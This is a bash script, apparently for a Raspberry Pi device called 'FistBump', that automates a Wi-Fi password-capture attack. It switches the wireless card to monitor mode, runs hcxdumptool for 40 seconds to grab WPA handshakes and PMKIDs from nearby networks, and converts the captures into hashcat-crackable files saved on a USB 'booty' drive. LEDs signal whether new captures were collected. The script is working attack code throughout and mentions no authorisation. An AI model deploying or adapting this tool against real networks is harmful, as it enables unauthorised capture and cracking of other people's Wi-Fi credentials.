 #!/bin/bash
# VARIABLES
DATE=$(date +"%Y%m%d%H%M")
bootydir="/media/usb0"
python /home/pi/FistBump/clearblinkt.py

if [ -e "/dev/sda" ]; then
        echo "flash drive attached"
	#number of handshakes existing
	prevCap=$(ls /media/usb0 | wc -l)
	echo $prevCap
else 
        echo "Error: Booty drive not present"
        echo "Please insert a usb thumb dirve"
	# show red for 2 second TODO
    	python /home/pi/FistBump/rgb.py 255 0 0 &
	sleep 3
	python /home/pi/FistBump/rgb.py 0 0 0 &
#	python /home/pi/FistBump/arm_trigger.py
	exit
fi

# ---- set up interface
python /home/pi/FistBump/purple_scan.py &
INDI=$!
sudo airmon-ng check kill

sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo rfkill unblock all
sudo ip link set wlan0 up

kill $INDI

# ---- start attack
python /home/pi/FistBump/random_colors.py &
INDI=$!

timeout -k 40 40 sudo hcxdumptool -i wlan0 --enable_status=3 -o $DATE.pcapng &
PID=$!

sleep 40

sudo kill -TERM $PID


sudo hcxpcaptool -z $bootydir/$DATE.16800 -o $bootydir/$DATE.2500 $DATE.pcapng
sudo rm $DATE.pcapng

kill $INDI

# -----check results
totalCap=$(ls /media/usb0 | wc -l)
if [ $totalCap -gt $prevCap ]; then
	python /home/pi/FistBump/rgb.py 255 0 255 &
else
	python /home/pi/FistBump/rgb.py 255 150 0 &
fi

sleep 3

python /home/pi/FistBump/rgb.py 0 0 0
python /home/pi/FistBump/clearblinkt.py 
python /home/pi/FistBump/arm_trigger.py
exit
